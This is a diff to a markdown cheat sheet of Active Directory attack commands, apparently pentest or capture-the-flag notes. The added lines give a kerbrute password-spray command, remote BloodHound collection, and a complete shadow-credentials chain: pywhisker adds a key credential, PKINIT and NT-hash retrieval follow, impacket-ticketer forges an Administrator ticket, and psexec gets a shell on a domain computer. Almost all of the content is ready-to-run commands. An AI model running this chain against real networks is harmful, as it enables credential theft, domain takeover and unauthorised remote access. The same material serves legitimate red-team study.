@@ -23,6 +23,7 @@
 
 ### How to know that username/password combination is valid - kerbrute (password spray) ?
 1. Command: `./kerbrute_linux_amd64 passwordspray --dc 192.168.110.55 -d somedomain.htb AD_users.txt 'password'`
+2. Command: `./kerbrute_linux_amd64 -d internal.abc.local passwordspray allUsers.txt 'Password100!' --dc 192.168.210.16'`
    
 #### Using impacket - To find all the usernames, email address etc?
 1. Without username/password command: `proxychains GetADUsers.py somedomain.htb/ -no-pass -dc-ip 192.168.110.55`
@@ -53,10 +54,19 @@
 2. The above command would you give you shell. 
 
 ### After shell, use SYSINTERNALS AD Explorer  / Bloodhound
+1. Remote Blooudhound from Kali, command: `proxychains bloodhound-python --zip -c all -d somedomain.local -u marcus -p 'Password100!' --dns-tcp -ns <DC IP address>`
 
 ### Useful commands - Assume Breach Appraoch - You're inside the DC network with valid user/pass combination
 1. **Local vs Domain** - This command tells all the users present in the current system. Command: `net user` or `net user <username>`
 3. **Local vs Domain** - This command tells all the users present in all the DC. Command: `net user /domain` or `net user <username>  /domain `
 
-
-  
+### AD Abuse - AddKeyCredentialLink [pywhisker.py -> gettgtpkinit.py - > getnthash.py -> impacket-lookupsid -> impacket-ticketer -> finally psexec / secretsdump)
+1. `proxychains python3 pywhisker.py -d "somedomain.local" -u 'username' -p 'Password100'  --target "COMP-ABC-1$" --action "list"`
+2. `proxychains python3 pywhisker.py -d "somedomain.local" -u 'username' -p 'Password100'  --target "COMP-ABC-1$" --action "add" --filename hacker`
+3. `proxychains python3 gettgtpkinit.py -cert-pfx "hacker.pfx" -pfx-pass "VSDR4fkJazANDrGfis03" "somedomain.local/COMP-ABC-1\$" out.cache`
+4. `proxychains python3 getnthash.py somedomain.local/COMP-ABC-1\$ -key bc39f3e57c5550412fbedd1430c3919f1f25f0a67117517242422029241d1c85`
+5. `proxychains impacket-lookupsid somedomain.local/username@192.168.210.10(DC) | grep "Domain SID"`
+6. `proxychains impacket-ticketer -nthash 89d0b56874f61ad38bad336a77b8ef2f -domain somedomain.local -domain-sid S-1-5-21-2734290894-461713716-141835440 Administrator -dc-ip 192.168.210.10(DC)`
+7. `export KRB5CCNAME=Administrator.ccache`
+8. `klist`
+9. `impacket-psexec somedomain.local/Administrator@192.168.210.10 -target-ip 192.168.210.11(ADComputer) -dc-ip 192.168.210.10(DC) -no-pass -k`
